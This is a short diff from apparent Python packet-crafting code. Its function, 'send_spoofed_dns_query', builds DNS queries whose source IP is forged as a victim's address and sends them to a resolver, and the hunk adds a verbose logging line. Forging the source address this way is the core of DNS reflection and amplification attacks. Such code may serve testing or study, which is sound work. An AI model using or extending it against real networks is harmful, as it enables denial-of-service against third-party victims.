@@ -48,3 +48,5 @@ def send_spoofed_dns_query(domain, resolver_ip, resolver_port, victim_ip,
     else:
         pkt_dns = DNS(id=txid_val, rd=1, qd=question)
     pkt = IP(src=victim_ip, dst=resolver_ip) / UDP(sport=victim_src_port, dport=resolver_port) / pkt_dns
+    if verbose:
+        print(f"Spoofed: {victim_ip}:{victim_src_port} -> {resolver_ip}:{resolver_port} qtype={qtype} domain={domain}")
